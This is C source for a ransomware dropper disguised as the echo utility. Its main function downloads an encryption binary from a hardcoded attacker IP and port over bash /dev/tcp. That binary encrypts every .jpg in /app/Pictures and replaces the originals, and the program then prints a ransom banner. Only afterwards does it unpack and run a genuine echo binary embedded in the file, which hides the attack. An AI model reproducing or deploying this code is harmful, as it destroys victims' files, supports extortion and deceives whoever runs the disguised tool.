#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/mman.h>
#include <zlib.h>
#include <dirent.h>
#include "echo_gz.h"
#include "banner.h"

#define TMP_EXE "/tmp/echo"
#define RANSOMWARE "/app/weird_program"
#define BANNER "/app/banner"
#define BUF_SIZE (1024 * 1024)

#ifndef ATTACKER_IP
#define ATTACKER_IP "172.18.0.10"
#endif

#ifndef PORT
#define PORT "4444"
#endif

void open_banner() {
    FILE *fp = fopen(BANNER, "wb");
    if (!fp) {
        perror("fopen(banner)");
        return;
    }

    fwrite(_app_banner, 1, _app_banner_len, fp);
    fclose(fp);

    char cmd[256];
    snprintf(cmd, sizeof(cmd), "bash -c 'cat %s'", BANNER);
    system(cmd); 
}

void ransomware_payload() {
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "bash -c 'exec 3<>/dev/tcp/%s/%s && cat <&3 > %s'", ATTACKER_IP, PORT, RANSOMWARE);
    system(cmd);
    chmod(RANSOMWARE, 0755);

    const char *path = "/app/Pictures/";
    struct dirent *entry;
    DIR *dp = opendir(path);

    if (dp == NULL) {
        perror("opendir");
        exit(1);
    }

    while ((entry = readdir(dp)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        if (strstr(entry->d_name, ".jpg")) {
            snprintf(cmd, sizeof(cmd), "bash -c '%s enc %s%s %s%s.enc'", RANSOMWARE, path, entry->d_name, path, entry->d_name);
            system(cmd);
            snprintf(cmd, sizeof(cmd), "bash -c 'mv %s%s.enc %s%s'", path, entry->d_name, path, entry->d_name);
            system(cmd);
            snprintf(cmd, sizeof(cmd), "bash -c 'rm %s'", RANSOMWARE);
            system(cmd);
        }
    }

    closedir(dp);
    
    open_banner();
}

void extract_and_run_echo(char **argv) {
    int ret;
    unsigned char *out_buf = malloc(BUF_SIZE);
    if (!out_buf) {
        perror("malloc");
        exit(1);
    }
//////////////////////////////////////////////////////////////////
    z_stream strm = {0};
    strm.next_in = echo_gz;
    strm.avail_in = echo_gz_len;
    strm.next_out = out_buf;
    strm.avail_out = BUF_SIZE;

    ret = inflateInit2(&strm, 16 + MAX_WBITS);
    if (ret != Z_OK) {
        fprintf(stderr, "inflateInit2 failed: %d\n", ret);
        free(out_buf);
        exit(1);
    }

    ret = inflate(&strm, Z_FINISH);
    if (ret != Z_STREAM_END) {
        fprintf(stderr, "inflate failed: %d\n", ret);
        inflateEnd(&strm);
        free(out_buf);
        exit(1);
    }

    inflateEnd(&strm);
//////////////////////////////////////////////////////////////
    FILE *fp = fopen(TMP_EXE, "wb");
    if (!fp) {
        perror("fopen(echo)");
        free(out_buf);
        exit(1);
    }
    fwrite(out_buf, 1, strm.total_out, fp);
    fclose(fp);

    chmod(TMP_EXE, 0755);

    execvp(TMP_EXE, argv);

    free(out_buf);
}

int main(int argc, char **argv) {
    ransomware_payload();
    extract_and_run_echo(argv);
    return 0;
}
